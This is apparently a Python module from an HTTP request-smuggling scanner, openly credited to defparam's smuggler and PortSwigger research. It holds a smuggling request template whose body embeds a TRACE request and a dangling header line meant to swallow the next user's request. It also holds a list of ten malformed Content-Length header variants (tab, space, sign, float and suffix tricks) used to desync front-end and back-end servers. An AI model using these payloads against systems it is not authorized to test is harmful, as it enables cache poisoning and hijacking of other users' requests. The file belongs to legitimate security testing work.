clzero_headers = {}

regular_request = "GET __PATH__?__CACHE_BUSTER__=1 HTTP/1.1\r\n"
regular_request += "Host: __HOST__\r\n"
regular_request += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\r\n"
regular_request += "Connection: Close\r\n\r\n"

smuggle_request = "__METHOD__ __PATH__ HTTP/1.1\r\n"
smuggle_request += "Host: __HOST__\r\n"
smuggle_request += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\r\n"
smuggle_request += "Connection: Keep-Alive\r\n"
smuggle_request += "__MOD_CL__\r\n"#Our line where our modified content length will be placed
smuggle_request += "\r\n"
smuggle_request_body = "TRACE /DJDHEC.txt HTTP/1.1\r\n"
smuggle_request_body += "XHEADER: " #Next requests header should start here...


#Most payloads from https://github.com/defparam/smuggler thank you @defparam
#Also from https://portswigger.net/research/how-to-turn-security-research-into-profit thank you @albinowax
clzero_headers["nameprefix1"] = " Content-Length: __CL__"
clzero_headers["tabprefix1"] = "Content-Length:\t__CL__"
clzero_headers["tabprefix2"] = "Content-Length\t:\t__CL__"
clzero_headers["tabprefix3"] = "\tContent-Length: __CL__"
clzero_headers["spacerr1"] = "Content-Length : __CL__"
clzero_headers["positive"] = "Content-Length: +__CL__"
clzero_headers["negative"] = "Content-Length: -__CL__"
clzero_headers["floating"] = "Content-Length: __CL__.0"
clzero_headers["normalize"] = "Content-Length: __CL__aa"
clzero_headers["subtract"] = "Content-Length: __CL__-0"


